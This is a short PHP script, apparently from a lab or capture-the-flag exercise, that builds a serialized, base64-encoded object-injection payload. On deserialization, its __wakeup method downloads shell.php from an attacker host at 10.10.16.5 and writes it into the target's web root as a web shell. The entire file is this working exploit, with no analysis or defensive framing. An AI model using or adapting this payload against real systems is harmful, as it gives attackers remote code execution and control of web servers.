<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = 'http://10.10.16.5/shell.php'; //remote
    public $imgPath = '/var/www/html/shell.php'; //local file to save

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
function get_theme(){
	 $up_cookie = base64_encode(serialize(new AvatarInterface()));
	 echo $up_cookie;
}

get_theme();
//$up = unserialize(base64_decode(get_theme()));
//echo $up->theme;


?>
